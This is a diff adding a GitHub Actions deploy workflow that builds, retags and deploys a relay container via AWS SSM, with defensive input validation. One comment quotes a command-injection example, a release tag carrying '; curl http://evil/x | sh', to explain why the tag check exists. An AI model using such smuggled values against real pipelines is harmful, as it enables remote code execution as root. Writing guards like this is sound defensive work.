@@ -1,0 +1,255 @@
+name: deploy
+
+on:
+  # R4 (accepted, docs/aws-deployment-plan.md Accepted tradeoffs): a dispatch runs
+  # from the chosen ref, so only tags cut after this workflow merged are dispatchable.
+  workflow_dispatch:
+    inputs:
+      environment:
+        description: "Target environment (prod + a prior tag ref = rollback)"
+        type: choice
+        options: [dev, staging, prod]
+        default: dev
+  release:
+    types: [published]
+
+# `id-token: write` is granted per job, not here: `meta` handles the untrusted
+# release tag and assumes no AWS role, so it must not hold an OIDC minting token.
+permissions:
+  contents: read
+
+# Release-triggered runs are always prod, and `inputs` is empty for them.
+concurrency:
+  group: deploy-${{ inputs.environment || 'prod' }}
+  cancel-in-progress: false
+
+jobs:
+  meta:
+    name: resolve environment and tags
+    runs-on: ubuntu-latest
+    outputs:
+      environment: ${{ steps.resolve.outputs.environment }}
+      sha_tag: ${{ steps.resolve.outputs.sha_tag }}
+      deploy_tag: ${{ steps.resolve.outputs.deploy_tag }}
+    steps:
+      - id: resolve
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_ENVIRONMENT: ${{ inputs.environment }}
+          RELEASE_TAG: ${{ github.event.release.tag_name }}
+          COMMIT_SHA: ${{ github.sha }}
+        run: |
+          # $GITHUB_OUTPUT is line-oriented and last-writer-wins, so a value
+          # carrying a newline forges a second `key=` line and overrides the
+          # one written here. Refuse CR/LF rather than trust every caller.
+          emit() {
+            case "$2" in
+              *[$'\n\r']*)
+                echo "refusing to emit $1: value contains a newline or carriage return" >&2
+                exit 1
+                ;;
+            esac
+            echo "$1=$2" >> "$GITHUB_OUTPUT"
+          }
+
+          SHA_TAG="sha-$(echo "$COMMIT_SHA" | cut -c1-12)"
+          emit sha_tag "$SHA_TAG"
+          if [ "$EVENT_NAME" = release ]; then
+            # $RELEASE_TAG is externally influenced (any repo-write actor can
+            # publish a release) and ends up inside the SSM AWS-RunShellScript
+            # `commands` string, which the instance re-parses as a shell script
+            # AS ROOT — step-level `env:` protects this runner only, not that
+            # hop, and prod carries no required reviewer. Git ref names permit
+            # `$(id)`, backticks, `;`, `&&` and `|`, so pin the tag to the
+            # release-please `simple` shape before it becomes an output.
+            #
+            # bash `=~` matches the WHOLE string. `grep -Eq` cannot: it is
+            # line-oriented and exits 0 on the first matching line, so
+            # $'v1.0.0\n; curl http://evil/x | sh' satisfied `^...$` and the
+            # payload rode through. Do not reintroduce a pipeline here.
+            # Regression test: tests/features/deploy-tag-guard.sh
+            if ! [[ "$RELEASE_TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+              echo "refusing to deploy: release tag '$RELEASE_TAG' is not a vX.Y.Z tag" >&2
+              exit 1
+            fi
+            emit environment prod
+            emit deploy_tag "$RELEASE_TAG"
+          else
+            emit environment "$INPUT_ENVIRONMENT"
+            emit deploy_tag "$SHA_TAG"
+          fi
+
+  build:
+    name: build and promote the image
+    needs: meta
+    runs-on: ubuntu-24.04-arm
+    permissions:
+      id-token: write
+      contents: read
+    outputs:
+      # The deploy job needs the fully qualified registry host but assumes a
+      # different role, so it cannot log in to ECR itself; login runs here
+      # unconditionally, so this is populated even when the build is skipped.
+      registry: ${{ steps.login-ecr.outputs.registry }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ vars.ECR_PUSH_ROLE_ARN }}
+          aws-region: ${{ vars.AWS_REGION }}
+
+      - id: login-ecr
+        uses: aws-actions/amazon-ecr-login@v2
+
+      - id: exists
+        name: Check for an existing sha tag
+        env:
+          ECR_REPOSITORY: ${{ vars.ECR_REPOSITORY }}
+          SHA_TAG: ${{ needs.meta.outputs.sha_tag }}
+        run: |
+          # ImageNotFoundException is the ONLY genuine "not built yet" case.
+          # Treating EVERY nonzero exit as absence let a transient/credential
+          # error (e.g. UnrecognizedClientException, which also exits 254) take
+          # the build branch, rebuild a different digest, and `docker push` onto
+          # an already-present immutable tag — which ECR rejects. A missing
+          # REPOSITORY is likewise not an absent image: it means ECR_REPOSITORY
+          # is wrong or RelayShared was never deployed, and letting it build only
+          # defers the real error to a confusing push failure. Capture stderr
+          # (2>&1 >/dev/null keeps stdout discarded) and re-raise anything else.
+          if err=$(aws ecr describe-images --repository-name "$ECR_REPOSITORY" \
+                     --image-ids imageTag="$SHA_TAG" 2>&1 >/dev/null); then
+            echo "found=true" >> "$GITHUB_OUTPUT"
+          elif printf '%s' "$err" | grep -q 'ImageNotFoundException'; then
+            echo "found=false" >> "$GITHUB_OUTPUT"
+          elif printf '%s' "$err" | grep -q 'RepositoryNotFoundException'; then
+            echo "$err" >&2
+            echo "ECR repository '$ECR_REPOSITORY' does not exist. Set the ECR_REPOSITORY variable to RelayShared's RepositoryName output (bootstrap runbook item 8), not its EcrRepositoryUri." >&2
+            exit 1
+          else
+            echo "$err" >&2
+            echo "aws ecr describe-images failed for a reason other than a missing image" >&2
+            exit 1
+          fi
+
+      # Registry tags are immutable, so an existing sha tag can never be re-pushed.
+      - name: Build and push (native arm64)
+        if: steps.exists.outputs.found == 'false'
+        env:
+          SHA_IMAGE: ${{ steps.login-ecr.outputs.registry }}/${{ vars.ECR_REPOSITORY }}:${{ needs.meta.outputs.sha_tag }}
+        run: |
+          docker build -f docker/Dockerfile.relay -t "$SHA_IMAGE" .
+          docker push "$SHA_IMAGE"
+
+      # Same-digest promotion: a manifest-level retag of the image already in the
+      # registry. NEVER rebuild to promote — a rebuild yields a different digest
+      # and breaks byte-identity between what staging validated and what prod runs
+      # (D6, SC3).
+      - name: Retag the released digest
+        if: github.event_name == 'release'
+        env:
+          SHA_IMAGE: ${{ steps.login-ecr.outputs.registry }}/${{ vars.ECR_REPOSITORY }}:${{ needs.meta.outputs.sha_tag }}
+          RELEASE_IMAGE: ${{ steps.login-ecr.outputs.registry }}/${{ vars.ECR_REPOSITORY }}:${{ needs.meta.outputs.deploy_tag }}
+        # There is deliberately NO docker/setup-buildx-action step in this job.
+        # Buildx is preinstalled on the runner image and `imagetools create` is a
+        # pure registry operation — it needs no builder instance (verified: it
+        # succeeds with no daemon and every builder in `docker buildx ls` down).
+        # A setup-buildx-action step with its defaults (driver: docker-container,
+        # use: true) would make a container-driver builder CURRENT, and since
+        # `docker build` is an alias for `docker buildx build`, the build above
+        # would run on it: with no --load the image never reaches the local
+        # store, buildx still exits 0, and `docker push` then fails with "An
+        # image does not exist locally with the tag". Reintroducing it with
+        # `docker buildx build --push` instead is equally wrong — default
+        # provenance/SBOM attestations wrap the result in an OCI index.
+        # Regression test: tests/features/deploy-buildx-guard.sh
+        #
+        # So the source here is a single-platform schema2 manifest (plain
+        # `docker build` + `docker push` on the bundled docker driver), and
+        # --prefer-index=false is load-bearing: the default (true) would wrap it
+        # in a NEW image index, so the v-tag would land on a DIFFERENT digest
+        # than the sha- tag.
+        run: docker buildx imagetools create --prefer-index=false --tag "$RELEASE_IMAGE" "$SHA_IMAGE"
+
+  deploy:
+    name: deploy and verify
+    needs: [meta, build]
+    runs-on: ubuntu-latest
+    # Hard ceiling on the SSM poll plus the 101 verify, so no future unbounded
+    # wait in either can ride GitHub's 360-minute default. The reviewer pause on
+    # staging is not billed against this — the clock starts once the job runs.
+    timeout-minutes: 15
+    permissions:
+      id-token: write
+      contents: read
+    # The only job carrying an environment: GitHub enforces staging's required
+    # reviewer here, and the deploy role's OIDC trust is bound to the subject
+    # `repo:cajias/obsidian-ee:environment:<env>`, so a wrong name is refused
+    # outright rather than merely ungated.
+    environment:
+      name: ${{ needs.meta.outputs.environment }}
+      url: https://${{ vars.RELAY_HOSTNAME }}
+    steps:
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
+          aws-region: ${{ vars.AWS_REGION }}
+
+      # /opt/relay/deploy.sh derives its registry login host from the image ref's
+      # first path segment, so $1 must be the fully qualified ref.
+      - name: Deploy via SSM run-command
+        env:
+          RELAY_INSTANCE_ID: ${{ vars.RELAY_INSTANCE_ID }}
+          IMAGE: ${{ needs.build.outputs.registry }}/${{ vars.ECR_REPOSITORY }}:${{ needs.meta.outputs.deploy_tag }}
+        run: |
+          CMD_ID=$(aws ssm send-command \
+            --instance-ids "$RELAY_INSTANCE_ID" \
+            --document-name AWS-RunShellScript \
+            --parameters commands="/opt/relay/deploy.sh $IMAGE" \
+            --query Command.CommandId --output text)
+          for i in $(seq 1 30); do
+            STATUS=$(aws ssm get-command-invocation --command-id "$CMD_ID" \
+              --instance-id "$RELAY_INSTANCE_ID" --query Status --output text) || STATUS=Pending
+            echo "attempt $i: $STATUS"
+            [ "$STATUS" = Success ] && exit 0
+            [ "$STATUS" = Failed ] && exit 1
+            sleep 5
+          done
+          echo "SSM command $CMD_ID never reached a terminal state" >&2
+          exit 1
+
+      # The upgrade completes with 101 BEFORE authentication — admission happens in
+      # the Identify message after the handshake — so an unauthenticated probe is a
+      # valid liveness check and must stay unauthenticated. The ~2 minute nominal
+      # budget covers first-deploy DNS propagation and Let's Encrypt issuance; with
+      # --max-time each failed attempt costs at most ~10s, so the worst case is
+      # ~4 minutes, bounded hard by this job's timeout-minutes.
+      #
+      # --http1.1 is load-bearing: curl defaults to HTTP/2 for https:// and
+      # Caddy 2 negotiates h2 via ALPN, where `Connection:` and `Upgrade:` are
+      # forbidden connection-specific fields that curl silently drops — the
+      # relay then answers a plain GET and this check can never see 101.
+      #
+      # --max-time is equally load-bearing: curl only takes its WebSocket path for
+      # a ws://|wss:// URL it drives itself, so against an https:// URL with
+      # hand-written Upgrade headers it treats the 101 as a FINAL response and
+      # reads the body to EOF — and a 101 has neither Content-Length nor chunked
+      # framing, so a relay that holds the connection open (the normal case) makes
+      # this hang forever. -w still prints the code on the timeout path, so the
+      # sentinel is applied only when nothing was captured at all.
+      - name: Verify the WebSocket upgrade returns 101
+        env:
+          RELAY_HOSTNAME: ${{ vars.RELAY_HOSTNAME }}
+        run: |
+          for i in $(seq 1 24); do
+            CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 --http1.1 \
+              -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
+              -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
+              "https://$RELAY_HOSTNAME/") || true
+            [ -z "$CODE" ] && CODE=000
+            echo "attempt $i: $CODE"
+            [ "$CODE" = "101" ] && exit 0
+            sleep 5
+          done
+          echo "no HTTP 101 from https://$RELAY_HOSTNAME/ within the retry budget" >&2
+          exit 1
